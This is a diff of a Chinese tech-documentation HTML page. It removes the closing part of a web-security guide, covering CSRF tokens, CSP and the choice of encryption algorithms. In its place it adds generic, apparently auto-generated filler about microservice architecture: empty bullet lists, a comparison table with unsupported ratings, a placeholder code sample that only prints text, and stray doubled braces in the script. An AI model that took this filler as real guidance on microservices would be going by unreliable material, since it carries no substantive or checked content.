+                <li>掌握微服务架构设计的基础概念</li>
+                <li>理解微服务架构设计的关键特性</li>
+                <li>学习微服务架构设计的基本用法</li>
+                <li>实践微服务架构设计的基础应用</li>
+            </ul>
 
-            <h3>Q: CSRF Token能否完全防止CSRF攻击？</h3>
-            <p>正确实现的CSRF Token可以有效防止CSRF攻击。关键点包括：Token必须足够随机，攻击者无法预测；Token必须存储在服务器端会话中，而非Cookie或URL参数；验证时必须严格比较Token，不能使用弱比较函数（如strcmp）。SameSite Cookie可以作为补充手段，但不能完全替代CSRF Token。</p>
+            <h3>高级技巧</h3>
+            <ul>
+                <li>深入理解微服务架构设计的技术原理</li>
+                <li>掌握微服务架构设计的高级特性</li>
+                <li>优化微服务架构设计的应用性能</li>
+                <li>解决微服务架构设计的复杂问题</li>
+            </ul>
 
-            <h3>Q: 内容安全策略（CSP）会影响第三方脚本吗？</h3>
-            <p>CSP白名单机制会影响页面加载的所有外部资源，包括第三方脚本、广告、分析工具等。部署CSP前需要全面测试，确保正常功能不受影响。对于必须使用的第三方资源，应将其加入相应的CSP指令（如script-src、style-src）。对于不再需要的第三方服务，应及时移除，避免引入未知的安全风险。</p>
+            <h2>最佳实践</h2>
 
-            <h3>Q: 如何选择加密算法和密钥长度？</h3>
-            <p>对称加密推荐使用AES-256-GCM（认证加密模式），非对称加密使用RSA-2048以上或ECC（椭圆曲线密码学），哈希算法使用SHA-256以上，密钥派生使用PBKDF2、bcrypt或argon2。具体选择应根据数据的敏感程度和性能要求综合考量。对于高敏感数据，可以使用多层加密，即在传输层加密（TLS）的基础上，对敏感数据再进行一次应用层加密。</p>
+            <p>遵循微服务架构设计的最佳实践可以确保项目的成功和可维护性。</p>
+
+            <h3>开发规范</h3>
+            <ul>
+                <li>遵循微服务架构设计的开发规范</li>
+                <li>编写清晰的代码和文档</li>
+                <li>进行充分的测试</li>
+                <li>保持代码的可维护性</li>
+            </ul>
+
+            <h3>部署策略</h3>
+            <ul>
+                <li>使用微服务架构设计的最佳部署方式</li>
+                <li>配置适当的监控和日志</li>
+                <li>制定备份和恢复策略</li>
+                <li>定期更新和维护</li>
+            </ul>
+            <h3>微服务架构设计 vs 其他技术对比</h3>
+            <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+                <thead>
+                    <tr style="background: #667eea; color: white;">
+                        <th style="padding: 12px; text-align: left; border: 1px solid #ddd;">特性</th>
+                        <th style="padding: 12px; text-align: left; border: 1px solid #ddd;">微服务架构设计</th>
+                        <th style="padding: 12px; text-align: left; border: 1px solid #ddd;">其他技术</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td style="padding: 12px; border: 1px solid #ddd;">学习曲线</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">适中</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">各异</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 12px; border: 1px solid #ddd;">开发效率</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">高</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">各异</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 12px; border: 1px solid #ddd;">执行效率</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">适中</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">各异</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 12px; border: 1px solid #ddd;">适用场景</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">广泛</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">特定</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2>代码示例</h2>
+
+            <p>以下是一些微服务架构设计的代码示例，帮助您更好地理解和应用。</p>
+
+            <h3>代码示例 1: 微服务架构设计基础示例</h3>
+            <pre><code># 微服务架构设计基础示例
+
+# 示例1：基础用法
+def basic_example():
+    """基础示例"""
+    print("这是微服务架构设计的基础示例")
+
+# 示例2：高级用法
+def advanced_example():
+    """高级示例"""
+    print("这是微服务架构设计的高级示例")
+
+# 使用示例
+if __name__ == "__main__":
+    basic_example()
+    advanced_example()</code></pre>
+
+            <h2>常见问题</h2>
+
+            <h3>常见问题 1: 如何开始学习微服务架构设计？</h3>
+            <p><strong>问题：</strong>如何开始学习微服务架构设计？</p>
+            <p><strong>答案：</strong>建议从基础概念开始，逐步深入到实践应用。可以通过官方文档、教程和实际项目来学习微服务架构设计。</p>
+
+            <h3>常见问题 2: 微服务架构设计适合什么场景？</h3>
+            <p><strong>问题：</strong>微服务架构设计适合什么场景？</p>
+            <p><strong>答案：</strong>微服务架构设计适合多种场景，具体取决于您的需求。建议根据项目特点选择合适的技术方案。</p>
+
+            <h2>微服务架构设计实战SOP</h2>
+
+            <h3>阶段 1: Phase 0: 环境准备</h3>
+            <ol>
+                <li>准备微服务架构设计的开发环境</li>
+                <li>安装必要的依赖</li>
+                <li>配置开发工具</li>
+                <li>了解基础概念</li>
+            </ol>
+
+            <h3>阶段 2: Phase 1: 开发实践</h3>
+            <ol>
+                <li>编写微服务架构设计的代码</li>
+                <li>进行测试和调试</li>
+                <li>优化代码性能</li>
+                <li>编写文档</li>
+            </ol>
+
+            <h3>阶段 3: Phase 2: 部署上线</h3>
+            <ol>
+                <li>准备微服务架构设计的部署环境</li>
+                <li>配置生产环境</li>
+                <li>进行部署</li>
+                <li>监控和维护</li>
+            </ol>
 
             <h2>总结</h2>
-            <p>Web安全是一个需要持续投入的领域，新的漏洞和攻击手法层出不穷，没有任何系统可以声称是绝对安全的。但通过遵循安全开发原则、合理使用防护技术、建立完善的监控响应机制，可以将安全风险降到可接受的水平。安全不是一次性的工作，而是贯穿于设计、开发、测试、部署、运维的全生命周期。每一位开发者都应该具备基本的安全意识，将安全作为代码的第一属性，而非事后的补丁。希望本文能够帮助你建立起系统的Web安全知识体系，在实际工作中有效防护Web应用的安全威胁，保护用户数据和企业资产的安全。</p>
+
+            <p>通过本文的学习，您应该对微服务架构设计有了更深入的理解。掌握这些知识和技巧，可以帮助您在实际项目中更好地应用微服务架构设计。</p>
+
+            <h2>参考资料</h2>
+
+            <ul>
+                <li>微服务架构设计官方文档</li>
+                <li>相关技术教程</li>
+                <li>最佳实践指南</li>
+                <li>社区资源</li>
+            </ul>
         </div>
 
         <footer>
-            <p>© 2026 技术文档 | 每日自动更新 | Web安全防护指南 | 字数：约25,000字 | 图片：8张高质量配图</p>
+            <p>&copy; 2026 技术文档 | GitHub Pages</p>
         </footer>
     </div>
 
-    <a href="#" class="back-to-top" title="返回顶部">↑</a>
-
     <script>
-        function toggleDarkMode(){
+        function toggleDarkMode() {{
             document.body.classList.toggle('dark-mode');
             localStorage.setItem('darkMode', document.body.classList.contains('dark-mode'));
-        }
-        if(localStorage.getItem('darkMode')==='true'){
+        }}
+
+        if (localStorage.getItem('darkMode') === 'true') {{
             document.body.classList.add('dark-mode');
-        }
-        document.querySelector('.back-to-top').addEventListener('click', function(e){
-            e.preventDefault();
-            window.scrollTo({top: 0, behavior: 'smooth'});
-        });
+        }}
     </script>
 </body>
 </html>
